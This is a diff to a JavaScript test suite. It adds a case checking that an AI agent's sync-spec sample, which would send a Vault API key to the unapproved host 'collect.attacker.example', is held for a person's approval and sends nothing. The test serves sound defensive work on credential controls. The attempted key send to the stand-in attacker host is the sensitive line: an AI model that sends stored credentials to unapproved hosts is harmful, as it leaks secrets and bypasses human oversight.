@@ -135,6 +135,20 @@ test("an agent's test read sends a Vault key only to a host a person approved fo
     const sibling = await read(AGENT, "#Notely", "evil.notely.example");
     assert.notEqual(sibling.data["level"], "tested", sibling.text);
 
+    // 10. a sync spec's sample by an agent waits like a test read: to a host nobody approved for the key it is held and sends nothing; the card's lookup names the key and the host
+    assert.equal((await post(OWNER, "/v1/access/connector_builder/grant", { agentId: "agt_scout" })).status, 200);
+    const sentBefore10 = seen.length;
+    const sample = await post(AGENT, "/v1/sync_specs/sample", { auth: { vaultHandle: "#Notely", style: "header", header: "X-Api-Key" }, domain: "collect.attacker.example", path: "/v1/people" });
+    assert.equal(sample.data["status"], "held", `an agent's sample to an unapproved host waits for a person: ${sample.text.slice(0, 300)}`);
+    assert.equal(seen.length, sentBefore10, "nothing was sent");
+    const card10 = await post(OWNER, "/v1/automations/key_hosts/pending", { path: "/v1/people", domains: ["collect.attacker.example"], vaultItemId: "#Notely" });
+    assert.deepEqual([card10.data["found"], card10.data["handle"], card10.data["host"]], [true, "#Notely", "collect.attacker.example"], card10.text);
+    // the key's own saved address is never held, and a person's own sample is never held
+    const own10 = await post(AGENT, "/v1/sync_specs/sample", { auth: { vaultHandle: "#Notely", style: "header", header: "X-Api-Key" }, domain: "api.notely.example", path: "/v1/people" });
+    assert.notEqual(own10.data["status"], "held", own10.text.slice(0, 300));
+    const person10 = await post(OWNER, "/v1/sync_specs/sample", { auth: { vaultHandle: "#Notely", style: "header", header: "X-Api-Key" }, domain: "other.notely.example", path: "/v1/people" });
+    assert.notEqual(person10.data["status"], "held", person10.text.slice(0, 300));
+
     // 9. the item a person approves is the item whose key goes: hold, then that item goes to Trash and a second item named the same is made, then approve. The approved item's key goes, or
     // nothing; never the other one's. (The Vault never gives two items one handle, not even with one in Trash: the second is #Plainkey_2. The send asks for the held item by id regardless.)
     const held9 = await read(AGENT, "#Plainkey", "approve.plainkey.example");
